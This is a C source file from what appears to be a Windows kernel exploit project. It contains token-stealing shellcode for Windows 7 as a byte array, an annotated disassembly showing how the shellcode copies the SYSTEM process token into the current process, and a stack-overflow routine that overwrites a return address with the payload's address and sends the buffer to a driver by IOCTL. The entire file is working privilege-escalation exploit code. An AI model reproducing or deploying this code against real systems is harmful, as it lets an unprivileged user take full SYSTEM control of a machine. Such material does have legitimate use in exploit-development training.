#include "StackOverflow.h"
#include "Common.h"

UCHAR g_TokenStealingPlayLoadShellCode[] =
{
	0x55, 0x8B, 0xEC, 0x60, 0x33, 
	0xc0, 0x64, 0x8b, 0x80, 0x24, 
	0x01, 0x00, 0x00, 0x8b, 0x40, 
	0x50, 0x8b, 0xc8, 0xba, 0x04, 
	0x00, 0x00, 0x00, 0x8b, 0x80, 
	0xb8, 0x00, 0x00, 0x00, 0x2d, 
	0xb8, 0x00, 0x00, 0x00, 0x39, 
	0x90, 0xb4, 0x00, 0x00, 0x00, 
	0x75, 0xed, 0x8b, 0x90, 0xf8, 
	0x00, 0x00, 0x00, 0x89, 0x91, 
	0xf8, 0x00, 0x00, 0x00, 0x61, 
	0x8b, 0xe5, 0x5d, 0xc3, 0x00
};


//002a30b0 55              push    ebp
//002a30b1 8bec            mov     ebp, esp
//002a30ce 60              pushad
//002a30cf 33c0            xor     eax, eax
//002a30d1 648b8024010000  mov     eax, dword ptr fs : [eax + 124h]
//002a30d8 8b4050          mov     eax, dword ptr[eax + 50h]
//002a30db 8bc8            mov     ecx, eax
//002a30dd ba04000000      mov     edx, 4
//002a30e2 8b80b8000000    mov     eax, dword ptr[eax + 0B8h]
//002a30e8 2db8000000      sub     eax, 0B8h
//002a30ed 3990b4000000    cmp     dword ptr[eax + 0B4h], edx
//002a30f3 75ed            jne     KernelExploit!TokenStealingPayloadWin7 + 0x32 (002a30e2)
//002a30f5 8b90f8000000    mov     edx, dword ptr[eax + 0F8h]
//002a30fb 8991f8000000    mov     dword ptr[ecx + 0F8h], edx
//002a3101 61              popad
//002a3112 8be5            mov     esp, ebp
//002a3114 5d              pop     ebp
//002a3115 c3              ret

BOOLEAN
StackOverflowWin7(VOID)
{
	BOOLEAN bRetValue = FALSE;
	PVOID EopPayload = &TokenStealingPayloadWin7;
	PCHAR pchUserModeBuffer = NULL;
	ULONG ulUserModeBuffersize = PAYLOAD_SIZE;
	PVOID pvMemoryAddress = NULL;
	ULONG ulRetBytes = 0;

	pchUserModeBuffer = (PCHAR)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		ulUserModeBuffersize
		);

	if (NULL == pchUserModeBuffer)
	{
		goto _RET;
	}

	RtlFillMemory(pchUserModeBuffer, ulUserModeBuffersize, 0x41);
	pvMemoryAddress = (PVOID)(((PCHAR)pchUserModeBuffer + ulUserModeBuffersize) - sizeof(ULONG));
	*(PULONG)pvMemoryAddress = (ULONG)EopPayload;

	SendIOCTL(
		STACK_OVERFLOW_CONTROL_CODE,
		pchUserModeBuffer,
		ulUserModeBuffersize
		);

	bRetValue = TRUE;

_RET:
	if (NULL != pchUserModeBuffer)
	{
		HeapFree(GetProcessHeap(), 0, (LPVOID)pchUserModeBuffer);
		pchUserModeBuffer = NULL;
	}

	return bRetValue;
}